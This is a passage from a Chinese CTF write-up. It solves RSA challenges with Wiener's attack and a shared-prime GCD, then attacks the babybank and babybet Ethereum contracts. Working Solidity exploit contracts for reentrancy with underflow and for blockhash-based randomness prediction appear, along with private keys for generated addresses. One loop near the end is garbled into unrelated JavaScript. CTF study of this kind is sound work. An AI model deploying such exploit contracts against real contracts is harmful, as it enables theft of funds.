    True
    '''
    m = 3359866727795952574047570400129983625808766359347672927740163405945044601265065800687792901768426453783209977783706554638017355219744329839231253397496875
    io.sendlineafter("[-]long_to_bytes(m).encode('hex')=",long_to_bytes(m).encode('hex'))
    io.recvuntil("[+]Generating challenge 6\n")
    n = io.recvline().split("=")[1].strip()
    io.recvline()
    io.recvline()
    e = io.recvline().split("=")[1].strip()
    io.recvline()
    c = io.recvline().split("=")[2].strip()
    '''
    def wiener(e, n):
        m = 12345
        c = pow(m, e, n)
        q0 = 1
        list1 = continued_fraction(Integer(e)/Integer(n))
        conv = list1.convergents()
        for i in conv:
            k = i.numerator()
            q1 = i.denominator()
            for r in range(20):
                for s in range(20):
                    d = r*q1 + s*q0
                    m1 = pow(c, d, n)
                    if m1 == m:
                        return d
            q0 = q1
    d = wiener(0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL, 0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L)
    print d
    d = 776765455081795377117377680209510234887230129318575063382634593357724998207571
    '''
    d = 776765455081795377117377680209510234887230129318575063382634593357724998207571
    c = 0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866c
    n = 0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27
    m = pow(c,d,n)
    io.sendlineafter("[-]long_to_bytes(m).encode('hex')=",long_to_bytes(m).encode('hex'))
    io.recvuntil("[+]Generating challenge 7\n")
    n = io.recvline().split("=")[1].strip()
    io.recvline()
    io.recvline()
    e = io.recvline().split("=")[1].strip()
    io.recvline()
    c = io.recvline().split("=")[2].strip()
    '''
        '[++++++++++++++++]all clear[++++++++++++++++]\n'
        'flag{17181389f36ebe098c4cebd3abe1096cdf7dd78f3db139e4958a7578f6fe6f44}\n'
### 强网先锋-辅助
    In [1]: from Crypto.Util.number import  inverse
    In [2]: c1,e,n1 = 2482083893746618248544426737023750400124543452082436334398504986023501710639402060949
       ...: 10669327946289696883902971209933623597622157156464290024082777471919953312405395315791985083821
       ...: 40219349074806334415773162638530112325183929049830280521558621542644011081249684040988239466918
       ...: 11798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432
       ...: 68494692274123205324989457541779606709065512270230613484822025794329764546147748808680485601832
       ...: 39867969991033855655404965344224063903559879768154507445359497850730090430071594969291871843385
       ...: 92859040917546122343981520508220332785862546608841127597, 65537, 149670300599751149502953998741
       ...: 85047053736587880127990542035765201425779342430662517765063258784685868107066789475747180244711
       ...: 35264646977673293854464158384231379187298635750446218492407522743349863142328918798835147566678
       ...: 51908542103895875949754560649846119904611266843010862415329152673116751641902134742453110196236
       ...: 54865937851653532870965423474555348239858021551589650169602439423841160698793338115204238140085
       ...: 73868088331343357406024360002850060082462435847340305959759389141217939916581362251290126338029
       ...: 95610196247414887793670193897757865472920653528850072242395817769758923853644464461856429391372
       ...: 87519945974807727
    In [3]: c2,e,n2 = 3829060039572042737496679186881067950328956133163629908872348108160129550437697677150
       ...: 59948392392579822432817559448321793883352022008723030347013852597046891551111132039618548256478
       ...: 39754353463544400357769097811584076360449864038198406483796096300393488954150457232088436311912
       ...: 52142600667607807479954194447237061080618370787672720344741413537975922184859333432197766580150
       ...: 53445700119676562167865995210801059627324423081232718278632976084403714971958726963213359514929
       ...: 40674909556448934027087202841797150021492240689288286565153264468817912286380085728893315119450
       ...: 42911372915003805505412099102954073299010951896955362470, 65537, 146246626287258206186223708039
       ...: 48630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057
       ...: 55022704839983724339249076216773308303036822124076469369432115010430604412593420169943014697046
       ...: 66574109992616308259311787318572675997503249186107900989525201135931302450105309613505927352394
       ...: 54337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741
       ...: 87403375697072435747053958984854870457309163391786938723932444773058754547256456149672488279949
       ...: 51867688583244908381691230770518903323136712203858304443315786743380140809596532018024765162374
       ...: 64651809255679979
    In [4]: from Crypto.Util.number import  inverse,GCD
    In [5]: GCD(n1,n2)
    Out[5]: 161993393900030566867150602363721535479433489542726899362944130872107225598993516228193877689420023695231584876954537089973673478074348422697619820309397363583748523503035462772765277978491082324620122838540365168604124924805412323471486221429513024367107238770298040268787441768635257727315317704741778501737L
    In [6]: p = GCD(n1,n2)
    In [7]: q = n1/p
    In [8]: d = inverse(e,(p-1)*(q-1))
    In [9]: m = pow(c1,d,n1)
    In [10]: m
    Out[10]: 46327402297756142163414444763385873143473454642530335007005275780577416655741L
    In [11]: from Crypto.Util.number import long_to_bytes
    In [12]: long_to_bytes(m)
    Out[12]: 'flag{i_am_very_sad_233333333333}'
### babybank
#### 原合约分析
合约字节码->伪代码
合约成员 | 成员说明  
---|---  
0x00 | balance map(address -> uint)  
0x01 | level map(address -> uint)  
0x02 | 合约创建者的地址 0x409dd71C0E5500dA1e0489d4885411b1Da52d4c2  
0x03 | 初始化为3fde42988fa35  
合约函数 | 参数 | 说明  
---|---|---  
withdraw | uint256 |
如果sender的balance大于参数，就向sender发送一个value为参数乘0x5af3107a4000的交易，从sender的balance中扣除参数  
profit | 无 | 如果sender的address最后四位为b1b1，且sender的level为0，sender的balance和level都加1  
0x8c0320de | string,string | 进入要求balance大于0x02540be400，第一个参数是战队token的MD5
第二个参数是base64编码的邮箱  
0x8e2a219e | uint256 | 如果sender是2号的值，将3号修改为传进来的值  
guess | uint256 | 如果传进来的值是3号的值，且sender的level为1，sender的balance和level都加1  
transfer | address,uint256 | 向address转移一定量的balance，只能转移0x02  
0xd41b6db6 | address | 返回sender的level  
balance | address | 返回sender的balance  
合约创建者调用了0x8e2a219e 参数值为3fde42988fa35
#### 原理
withdraw函数会给调用者发送以太坊，如果调用者是合约，就会调用合约的function() payable。  
如果合约中function()
payable调用了withdraw，这时最外层的withdraw尚未减少balance，所以第二次调用的withdraw会将balance减少到0，回到最外层的withdraw，就会将balance溢出。  
但是要想发送以太坊就得让账户上有以太坊，而直接把以太坊发送给原合约是不行的，可以通过创建临时合约，在将以太坊转移到临时合约，最后通过selfdestruct(address)将临时合约上的以太坊强制转移到address上。
#### 步骤
  1. 先创建一个地址最后四位为b1b1的账号
        import binascii
    import sha3
    from ecdsa import SigningKey, SECP256k1
    while 1:
     priv = SigningKey.generate(curve=SECP256k1) #生成私钥
     pub = priv.get_verifying_key() #生成公钥
     keccak = sha3.keccak_256()
     keccak.update( pub.to_string()) #keccak_256哈希运算
     address = "0x" + keccak.hexdigest()[24:]
     priv_key = binascii.hexlify( priv.to_string())
     pub_key = binascii.hexlify( pub.to_string())
     print("Private key: " + priv_key.decode() )
     print("Public key:  " + pub_key.decode() )
     print("Address:     " + address)
     print address[-4:]
     if "b1b1" == address[-4:]:
         break
generate online:
        Address: 0xb1D0cA3f763cFAAa494aF658f7B502D16eD1b1b1
    Private key: 0d7438e0cafa6df372600aef059cf2621938f34ae9d1fd4683cea7ec96668639
    Address: 0x1b6FA3DfcD943f5c513815af92355bF893b7b1b1
    Private key: 6b8cd7688f612415d639ccffc179e8e31e0ab3b3fe57dc39c9eb0fbd9d4a6449
    Address: 0xE9046061fc2eDaAd9910181396B212161067b1B1
    Private key: 660fe55dc06323ed5a43cf6c5ebb4fbfe22f9a28f1788d4cb840ea102e8cd337
    Address: 0xC7A403Fe97525d01E368D4f7f1920F4fe0BfB1B1
    Private key: 95923502fff00e0393368e750535f500b5ee6db938d89d0ecd9d62c8b609ae9c
  2. 创建合约A
        pragma solidity ^0.4.18;
    contract ctf {
     address callee = 0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c;
     bytes4 f1 = 0x2e1a7d4d;
     bytes4 f2 = 0x8c0320de;
     bool count = false;
     function() payable public 
     {
         if (!count)
         {
             callee.call(f1,2);
             count = true;
         }    
     }
     function hello() public returns (bool)
     {
         if(callee.call(f1,2))
             return callee.call(f2,"2d5088d4cac1e7d5f935659807a44db8","bHRzbWFrZXJAbGl2ZS5jbg==");
     }
    }
  3. 创建临时合约B 
        pragma solidity ^0.4.18;
    contract ctf2 {
     function() payable public 
     {
     }
     function awsl(address to) public
     {
         selfdestruct(to);
     }
    }
  4. profit()
  5. guess(3fde42988fa35)
  6. transfer(合约A地址,2)
  7. 转移以太坊到临时合约
  8. 毁灭临时合约
  9. 调用合约A上的函数
### babybet
#### 原理
bet里面生成的随机数可被控制。  
一个address最多获取1000点balance，而payforflag需要1000000点，生成1000个账号获取balance，最后转移到一个账号上。
#### 步骤
    pragma solidity ^0.4.18;
    contract awsl {
        address caller = 0xC7A403Fe97525d01E368D4f7f1920F4fe0BfB1B1;
        address sender = 0x5d1beefd4de611caff204e1a318039324575599a;
        bytes4 profit_addr = 0x66d16cc3;
        bytes4 bet_addr = 0x7365870b;
        bytes4 transfer_addr = 0xf0d25268;
        function awsl() payable public
        {
            //caller = msg.sender;
        }
        function attack() payable public
        {
            sender.call(profit_addr);
            bytes32 entropy = block.blockhash(block.number-1);
            uint num = uint(entropy) % 0x03;
            sender.call(bet_addr,num);
            sender.call(transfer_addr,caller,1000);
            selfdestruct(caller);
        }
    }
    contract bitit {
        address sender = 0x5d1beefd4de611caff204e1a318039324575599a;
        bytes4 profit_addr = 0x66d16cc3;
        bytes4 bet_addr = 0x7365870b;
        bytes4 getflag_addr = 0x8c0320de;
        function() payable public 
        {
        }
        function aaaaaaaaa() payable public
        {
            for (int i=0;i {
            var output = "";
            if (!err) {
                output += res;
            } else {
                output = "Error";
            }
            console.log(output);
        })
    }
  1. 部署合约
  2. aaaaaaaaa() 53次  
(aaaaaaaaa中最多只能进行19次操作，不然就out of gas了)
  3. getflag